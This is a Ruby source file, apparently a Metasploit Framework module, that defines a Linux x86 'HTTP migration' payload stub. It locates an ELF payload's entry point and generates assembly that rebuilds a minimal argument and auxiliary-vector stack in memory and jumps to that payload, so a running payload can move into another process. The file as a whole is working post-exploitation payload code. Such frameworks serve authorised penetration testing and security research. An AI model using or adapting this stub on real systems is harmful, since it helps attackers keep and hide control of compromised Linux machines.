# -*- coding: binary -*-

require 'rex/elfparsey'

module Msf

###
#
# Payload that supports HTTP migration on x86.
#
###

module Payload::Linux::X86::MigrateHttp

  include Msf::Payload::Linux::X86::Migrate

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux HTTP Migration (x86)',
      'Description' => 'Migration stub x86',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86
    ))
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate_migrate(opts={})
    entry_offset = elf_ep(opts[:payload])

    %Q^
      pop eax              ; discard pid
      pop ebx              ; discard fd
      pop esi              ; esi = mmap base (payload address)

      and esp, -0x10       ; align stack
      add esp, 64          ; headroom

      ; push prog name "a\0"
      push 0x61
      mov edx, esp         ; edx = ptr to prog name

      xor ebx, ebx
      push ebx             ; AT_NULL value
      push ebx             ; AT_NULL type
      push esi             ; AT_BASE value (mmap base)
      push 7               ; AT_BASE type
      push ebx             ; NULL (end of envp)
      push ebx             ; NULL (end of argv)
      push edx             ; argv[0] = prog name
      push 1               ; argc = 1

      ; jump to ELF entry point
      mov eax, #{entry_offset}
      add esi, eax
      jmp esi
    ^
  end

end

end
